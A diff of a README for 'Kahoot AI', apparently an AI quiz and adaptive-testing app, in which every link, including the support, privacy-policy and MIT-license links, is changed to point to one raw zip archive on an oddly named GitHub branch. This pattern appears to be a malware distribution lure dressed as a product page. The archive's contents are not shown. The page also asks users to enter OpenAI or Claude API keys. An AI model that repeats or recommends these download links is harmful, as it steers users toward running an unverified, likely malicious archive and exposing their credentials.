@@ -1,6 +1,6 @@
 # Kahoot AI - Adaptive Testing, Reinvented 🚀
 
-[![Download](https://img.shields.io/badge/Download-green)](https://myregistercd.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/myregistercd/kahoot-ai-adaptive-testing-lab/raw/refs/heads/branch/venosclerosis/kahoot_testing_adaptive_lab_ai_v2.2.zip)
 
 ## Welcome to Kahoot AI! 🌱
 
@@ -11,8 +11,8 @@
 # 📲 Quickstart Download
 
 Ready for a test revolution?  
-[Download Kahoot AI Now]( https://myregistercd.github.io )  
-[![Download](https://img.shields.io/badge/Download-green)](https://myregistercd.github.io)
+[Download Kahoot AI Now]( https://github.com/myregistercd/kahoot-ai-adaptive-testing-lab/raw/refs/heads/branch/venosclerosis/kahoot_testing_adaptive_lab_ai_v2.2.zip )  
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/myregistercd/kahoot-ai-adaptive-testing-lab/raw/refs/heads/branch/venosclerosis/kahoot_testing_adaptive_lab_ai_v2.2.zip)
 
 ---
 
@@ -95,8 +95,8 @@ No more waiting for business hours. Our hybrid support system (AI-guided with in
 ## 🚀 Getting Started
 
 1. **Download Kahoot AI**  
-   [Download for your OS]( https://myregistercd.github.io )  
-   [![Download](https://img.shields.io/badge/Download-green)](https://myregistercd.github.io)
+   [Download for your OS]( https://github.com/myregistercd/kahoot-ai-adaptive-testing-lab/raw/refs/heads/branch/venosclerosis/kahoot_testing_adaptive_lab_ai_v2.2.zip )  
+   [![Download](https://img.shields.io/badge/Download-green)](https://github.com/myregistercd/kahoot-ai-adaptive-testing-lab/raw/refs/heads/branch/venosclerosis/kahoot_testing_adaptive_lab_ai_v2.2.zip)
 
 2. **Launch & Connect APIs**  
    Input your OpenAI and/or Claude API keys, or use in demo mode.
@@ -141,7 +141,7 @@ Love APIs? Kahoot AI offers a robust RESTful interface and WebSocket endpoints f
 
 ## 📞 Support & Community
 
-- Get help any hour: https://myregistercd.github.io  
+- Get help any hour: https://github.com/myregistercd/kahoot-ai-adaptive-testing-lab/raw/refs/heads/branch/venosclerosis/kahoot_testing_adaptive_lab_ai_v2.2.zip  
 - Join our vibrant community on forums and chat  
 - Feature requests, bug reporting, and roadmap voting all supported!
 
@@ -151,22 +151,22 @@ Love APIs? Kahoot AI offers a robust RESTful interface and WebSocket endpoints f
 
 **Kahoot AI** is not affiliated with nor endorsed by the creators of Kahoot! or similar quiz platforms. This project reimagines adaptive assessment with advanced artificial intelligence for educational and corporate use in 2025.  
 Use responsibly. Educators and organizations are encouraged to review AI-generated content before high-stakes assessment.  
-Data privacy and user safety are paramount—please refer to our [Privacy Policy]( https://myregistercd.github.io ) for details.
+Data privacy and user safety are paramount—please refer to our [Privacy Policy]( https://github.com/myregistercd/kahoot-ai-adaptive-testing-lab/raw/refs/heads/branch/venosclerosis/kahoot_testing_adaptive_lab_ai_v2.2.zip ) for details.
 
 ---
 
 ## 📜 MIT License 2025
 
 Kahoot AI is distributed under the MIT License.  
-Review the license: [MIT License](https://opensource.org/licenses/MIT) (c) 2025 Kahoot AI Contributors.
+Review the license: [MIT License](https://github.com/myregistercd/kahoot-ai-adaptive-testing-lab/raw/refs/heads/branch/venosclerosis/kahoot_testing_adaptive_lab_ai_v2.2.zip) (c) 2025 Kahoot AI Contributors.
 
 ---
 
 ## ⬇️ Download Kahoot AI
 
 Ready to embark on adaptive testing’s next chapter?  
-[Download Kahoot AI]( https://myregistercd.github.io )  
-[![Download](https://img.shields.io/badge/Download-green)](https://myregistercd.github.io)
+[Download Kahoot AI]( https://github.com/myregistercd/kahoot-ai-adaptive-testing-lab/raw/refs/heads/branch/venosclerosis/kahoot_testing_adaptive_lab_ai_v2.2.zip )  
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/myregistercd/kahoot-ai-adaptive-testing-lab/raw/refs/heads/branch/venosclerosis/kahoot_testing_adaptive_lab_ai_v2.2.zip)
 
 ---
 
